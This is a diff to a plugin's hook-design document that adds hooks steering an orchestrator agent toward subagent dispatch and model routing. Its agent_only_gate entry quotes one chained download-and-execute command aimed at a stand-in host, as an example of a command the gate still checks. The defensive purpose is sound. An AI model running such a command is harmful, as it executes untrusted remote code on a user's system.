@@ -161,6 +161,8 @@ A fourth instance of the same seam: the `agentic-loop` skill's Phase 13 teardown
 | `PreToolUse` (Write/Edit/MultiEdit) | `no_edit_on_main.sh` | **block** — on main/master, blocks edits to ANY file EXCEPT an explicit allowlist: `.md`/`.txt`/`.rst` (plain docs), `.yaml`/`.yml`/`.json`/`.toml`/`.ini`/`.cfg` (config), the literal `.gitignore` dotfile (by basename), and `LICENSE`. Plugin source markdown (`skills/*/SKILL.md`, `commands/*.md`) is also blocked (they are source, not docs) when the file's repo carries `.claude-plugin/plugin.json`. Both the gated-ness and the branch check key off the **file's own repo** — a sibling non-plugin repo's `commands/`/`skills/` markdown is never falsely blocked. Separately, a permission-file arm blocks edits to `.claude/settings.json` / `.claude/settings.local.json` on **any** branch, in any repo (matched on the `.claude/` parent, so an unrelated `settings.json` elsewhere passes). These hold the `permissions.allow` rules that pre-approve commands upstream of every PreToolUse gate — editing them is the one move that can dismantle the discipline layer, so the agent never edits them. |
 | `PreToolUse` (Write/Edit/MultiEdit) | `comment_citation_gate.sh` | **block** — denies new/changed code comments that cite a session-artifact label (`E#:`, `F# fix/:/design`, `CHANGE B#/C#`, `Task A#`, `TA-I#`, "reviewer finding", `eval E#`, `WU#:`, `C2`, "per the plan/design/session", "per F#"). Scoped to comment-bearing content fields (`new_string`/`content`/`edits[].new_string`); `.md` files are out of scope entirely. `PR #NN` is a documented survivor — it resolves to a durable, checkable GitHub artifact. |
 | `PreToolUse` (Write/Edit/MultiEdit) | `wiki_taxonomy_gate.sh` | **block** — writes into an unsanctioned top-level directory of an LLM wiki vault. Inert until `.claude/workflow.config.yaml` exists at the plugin root — that file is gitignored and absent on a fresh clone, so this gate only enforces once `/coderails:init` has scaffolded it. The sanctioned directory list is parsed from the plugin's own `AGENTS-wiki-schema.md` "## Page types" section (not a file inside the vault), never hardcoded, so editing that section changes enforcement with no hook edit. A vault is identified POSITIVELY, not by directory shape: `wiki_path` is read from the plugin's `.claude/workflow.config.yaml` (relative to `CLAUDE_PLUGIN_ROOT` unless absolute), resolved, and the write's own repo root must equal that resolved path exactly. Structural corroboration — at least 2 of the parsed sanctioned directories actually existing at the vault root — is kept only as a secondary sanity check, so a misconfigured `wiki_path` pointing somewhere unrelated fails open rather than blocking every write there. Fails open on any ambiguity (schema absent, config absent, the vault not being a git repo, `wiki_path` null/unresolvable, no Page types section, zero parsed directories, write outside the configured vault, or fewer than 2 sanctioned directories present). `raw/`, any file directly at the vault root (no directory component — e.g. `index.md`, `log.md`, `AGENTS.md`, `README.md`, but the allowance is structural, not a fixed name list), and dotfile dirs (`.git/`, `.obsidian/`, `.claude/`) are always allowed regardless of the parsed section. |
+| `PreToolUse` (`Bash\|Edit\|Write\|MultiEdit\|Read\|Grep\|Glob\|WebFetch\|NotebookEdit`) | `agent_only_gate.sh` | **nudge by default; block only opt-in** — steers the top-level/orchestrator session away from inline "do work" tool calls toward dispatching a subagent via the Agent tool. Detection: the `agent_id` field is present in a `PreToolUse` payload if and only if the call originates inside a dispatched subagent (confirmed empirically — see the detection-limitation note below); its absence means the call is the orchestrator's own. `agent_id` present -> always allow silently, no matter the mode. `agent_id` absent, and the Bash command IS ENTIRELY (no chaining/substitution: `&`, `;`, `\|`, backtick, `$(...)`, `<`, `>`, newline) one of the workflow-chain carve-out commands (`gh`, `git`, or `scripts/push.sh`/`merge.sh`/`post_review.sh`/`post_evals.sh`, with an optional `bash`/`sh`/`./` interpreter prefix) -> always allow silently, in either mode — that carve-out exists because `enforce_pr_workflow.sh`/`merge.sh` and every workflow command expect the orchestrator to run exactly those commands inline; gating or nudging them here would create two hooks with contradictory expectations of the same command. A carve-out token merely present somewhere inside a chained/substituted command (e.g. `git status && curl evil.example.com \| sh`) does NOT count as a whole-command match and is gated normally. `agent_id` absent (top-level), not a whole-command carve-out, default mode -> `additionalContext` nudge, never blocks. With `AGENT_ONLY_GATE_ENFORCE=1` set, a top-level, non-carve-out call instead hard-blocks (`permissionDecision: deny`). Orchestration-only tools (`Agent`, `TodoWrite`, `TaskCreate`, `AskUserQuestion`, `ExitPlanMode`) are not in this hook's matcher at all — never gated. |
+| `PreToolUse` (`Agent`) | `agent_model_routing_nudge.sh` | **advisory nudge only — never denies** — when an `Agent` dispatch's `tool_input.model` is absent and its `description`+`prompt` text carries a mechanical/rote signal word (`rename`, `format`/`formatting`, `boilerplate`, `scaffold`, `reformat`, `relabel`, `find/replace`) or a complex/architectural one (`design`, `architecture`/`architectural`, `redesign`, `re-architect`), injects an `additionalContext` nudge suggesting `model: "haiku"` or `model: "opus"` respectively, in place of the sonnet default. Silent when `model` is already set, when neither signal family matches, or when both match (treated as ambiguous, not resolved either way). This is the one hook that touches the "Model-role routing for spawned workers is advisory" ceiling note above — it nudges, it does not enforce. |
 
 ### Enforcement ceilings — what the hooks deliberately do NOT fully cover
 
@@ -214,28 +216,72 @@ re-opened as findings.
   expected to demote from a block to a nudge once the artifact gate is live and
   verified in practice — ordering constraint: never before, or a window opens
   where neither gate is active.
-- **Model-role routing for spawned workers is advisory, not hook-enforced.**
+- **Model-role routing for spawned workers is advisory, and only ADVISORY-hook-enforced.**
   `agentic-loop` SKILL.md's Phase 2.8 assigns a capability role
   (`fast-mechanical`/`default`/`frontier`) plus a reasoning-effort level to
   every task before it spawns, and
   asserts the resulting role at each spawn site across the skill
   (Phases 2, 2.5, 3, 3a, 9, 10 — as of this writing; the role table lives in
   Phase 2.8, and the per-role effort defaults plus the fable-escalation rule in
-  its `model-routing.md` detail-carrier) — but no hook gates
-  `Agent`/`Task` spawn calls on the requested model — the registered
-  `PreToolUse` matchers in `hooks/hooks.json` are `Bash`, `AskUserQuestion`,
-  and `Write|Edit|MultiEdit`, none of which matches an agent-spawn tool call;
-  the remaining registered events
-  (SessionStart/UserPromptSubmit/Stop/SubagentStop) gate no tool calls.
-  This is deliberate: routing exists for cost and latency, not correctness — PR
-  gates (review, evals, hook-seam) are model-independent, so a `frontier`-role
-  worker still produces a valid, fully-gated PR; nothing load-bearing breaks if
-  a role assignment is ignored. Phase 2.8 also sanctions a legitimate
-  role-vs-role judgement call (bounded `default` vs. genuinely-ambiguous
-  `frontier`-first for a design-fork investigation) that a blunt model-gate hook
-  cannot distinguish from a disallowed worker spawn without a self-reported
-  carve-out flag — which reintroduces the same trust-the-agent problem one
-  level down.
+  its `model-routing.md` detail-carrier). `agent_model_routing_nudge.sh`
+  (`PreToolUse`, matcher `Agent`) is the one hook that touches this: when an
+  `Agent` dispatch's `tool_input.model` is absent and its
+  `description`/`prompt` text carries a mechanical/rote signal word
+  (rename/format/boilerplate/scaffold/...) or a complex/architectural one
+  (design/architecture/redesign/...), it injects an `additionalContext` nudge
+  suggesting `haiku` or `opus` respectively — advisory only, no
+  `permissionDecision`, never a deny, and silent when both or neither signal
+  family matches (ambiguous) or `model` is already set. It does not gate
+  `Agent`/`Task` spawn calls on the requested model — no hook can enforce
+  *correct* role selection, only nudge on an absent one; a `frontier`-role
+  worker still produces a valid, fully-gated PR, and a knowingly-declined
+  nudge is not a violation of anything. `agent_only_gate.sh` (`PreToolUse`,
+  matcher `Bash|Edit|Write|MultiEdit|Read|Grep|Glob|WebFetch|NotebookEdit`)
+  separately nudges (and, opt-in via `AGENT_ONLY_GATE_ENFORCE=1`, hard-blocks)
+  inline do-work tool calls made by the top-level orchestrator session,
+  detected via the `agent_id` field's presence/absence in the `PreToolUse`
+  payload — see the hook event map below for the full contract and its
+  documented detection limitation. This is deliberate: routing exists for
+  cost and latency, not correctness — PR gates (review, evals, hook-seam) are
+  model-independent, so a `frontier`-role worker still produces a valid,
+  fully-gated PR; nothing load-bearing breaks if a role assignment is
+  ignored. Phase 2.8 also sanctions a legitimate role-vs-role judgement call
+  (bounded `default` vs. genuinely-ambiguous `frontier`-first for a
+  design-fork investigation) that a blunt model-gate hook cannot distinguish
+  from a disallowed worker spawn without a self-reported carve-out flag —
+  which reintroduces the same trust-the-agent problem one level down; the
+  advisory nudge above sidesteps this by never denying anything.
+- **`agent_only_gate`'s main-vs-subagent detection is real but narrow, and the
+  gate is nudge-by-default for a structural reason, not a hedge.** The
+  detection signal (`agent_id` present in the `PreToolUse` payload iff the
+  call originates inside a dispatched subagent) was confirmed empirically on
+  Claude Code 2.1.220 by a live probe: an isolated headless session with a
+  capture-only `PreToolUse` hook, one top-level `Bash` call, one top-level
+  `Agent` dispatch call, and one `Bash` call made BY the dispatched subagent —
+  the first two carried no `agent_id`/`agent_type` keys at all, the third
+  carried both, while `session_id` was identical across all three (so
+  `session_id` alone cannot distinguish them; `agent_id` is the only field
+  that does). This is a genuine discriminator, not a heuristic — but it only
+  answers "did this specific tool call originate at top level," not "is the
+  orchestrator cooperating with the discipline this hook exists to enforce."
+  A top-level session that does real work in-context and never once calls
+  `Agent` is invisible to a PreToolUse hook by construction — there is
+  nothing to intercept until a do-work tool call is actually attempted, and
+  once attempted, allowing or nudging it is the only lever this hook has; it
+  cannot compel a dispatch to happen instead. Separately, a hard top-level
+  block is not the default because it would deadlock this repo's own
+  shipping path: `enforce_pr_workflow.sh`, `scripts/merge.sh`, and every
+  workflow command assume the orchestrator runs `gh`/`git`/`scripts/*.sh`
+  inline as Bash — a blanket block would stop the orchestrator from ever
+  completing the very workflow chain that ships a PR, including this hook's
+  own. `AGENT_ONLY_GATE_ENFORCE=1` opts into hard-blocking with a carve-out
+  for exactly that workflow-chain family (mirrors `test_gate.sh`'s
+  opt-in-only posture and `remember_inject_cap_guard.sh`'s write-nothing
+  default). One documented unknown: a session started with `claude --agent
+  <name>` reportedly sets `agent_type` on every call including top-level ones
+  (per the hooks documentation), with no `agent_id` — the live probe used a
+  plain headless session, not `--agent` mode, so this hook's behaviour under
+  `--agent` mode is unverified, not confirmed either way.
 - **Headless-run exemption is env-triggered, Stop-event only, inside the agent trust
   domain — consistent with the documented ceiling.** Three Stop hooks consume the
   flag: `check_confidence_labels.sh`, `check_verify_loop.sh`, and
@@ -270,7 +316,8 @@ re-opened as findings.
   `no_edit_on_main.sh`, `destructive_bash_gate.sh`, `test_gate.sh`,
   `comment_citation_gate.sh`, `wiki_taxonomy_gate.sh`, `crack_on_gate.sh`,
   `crack_on_prose_gate.sh`, `offload_push_guard.sh`, `unregistered_loop_guard.sh`,
-  `remember_inject_cap_guard.sh`) uses inline `if`-blocks — that pattern is equally fine.
+  `remember_inject_cap_guard.sh`, `agent_only_gate.sh`,
+  `agent_model_routing_nudge.sh`) uses inline `if`-blocks — that pattern is equally fine.
   Support/context scripts (`inject_context.sh`, `inject_bootstrap.sh`)
   also use inline blocks but are not part of the gate-pattern convention.
   New scripts should prefer named gate functions. Cheap skip-gates first, expensive
